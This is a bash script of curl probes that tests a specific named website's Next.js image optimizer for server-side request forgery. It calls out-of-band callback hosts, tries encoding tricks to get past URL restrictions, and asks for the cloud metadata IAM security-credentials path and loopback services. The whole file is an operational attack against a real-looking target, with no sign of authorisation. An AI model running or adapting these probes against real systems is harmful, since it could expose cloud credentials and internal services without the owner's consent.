#!/bin/bash
B=https://www.infinitycapital.bh
H1=oobf573f4f78b9b.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
H2=oobf0e15f1070fb.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in

# 1. legitimate ctfassets image (does optimizer run at all?)
echo "### legit ctfassets"
curl -s -o /dev/null -m 30 -w "%{http_code} %{size_download} %{content_type}\n" \
 "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=640&q=75"

# 2. raw unencoded OOB host (some builds only restrict encoded)
echo "### raw oob host"
curl -s -m 30 -o /dev/null -w "%{http_code} %{size_download}\n" "$B/_next/image?url=http://$H1/raw.png&w=640&q=75"
echo "### encoded oob host"
curl -s -m 30 -o /dev/null -w "%{http_code} %{size_download}\n" --get "$B/_next/image" --data-urlencode "url=http://$H1/enc.png" -d "w=640" -d "q=75"
echo "### double encoded"
curl -s -m 30 -o /dev/null -w "%{http_code} %{size_download}\n" "$B/_next/image?url=http%3A%2F%2F$H1%2Fdbl.png&w=640&q=75"

# 3. cloud metadata
echo "### metadata"
curl -s -m 30 -w "\n[%{http_code}]\n" --get "$B/_next/image" --data-urlencode "url=http://169.254.169.254/latest/meta-data/" -d "w=64" -d "q=75" | head -c 300
echo "### metadata iam"
curl -s -m 30 -w "\n[%{http_code}]\n" --get "$B/_next/image" --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" -d "w=64" -d "q=75" | head -c 300

# 4. internal loopback
echo "### loopback root"
curl -s -m 30 -w "\n[%{http_code}]\n" --get "$B/_next/image" --data-urlencode "url=http://127.0.0.1/" -d "w=64" -d "q=75" | head -c 200
echo "### localhost 3000"
curl -s -m 30 -w "\n[%{http_code}]\n" --get "$B/_next/image" --data-urlencode "url=http://localhost:3000/" -d "w=64" -d "q=75" | head -c 200

# 5. DNS-only sink host
echo "### dns host in url"
curl -s -m 30 -o /dev/null -w "%{http_code} %{size_download}\n" --get "$B/_next/image" --data-urlencode "url=http://$H2/dns.png" -d "w=640" -d "q=75"

# 6. error body for a rejected url
echo "### body of blocked example host"
curl -s -m 30 -w "\n[%{http_code}]\n" --get "$B/_next/image" --data-urlencode "url=https://example.org/a.png" -d "w=640" -d "q=75" | head -c 300
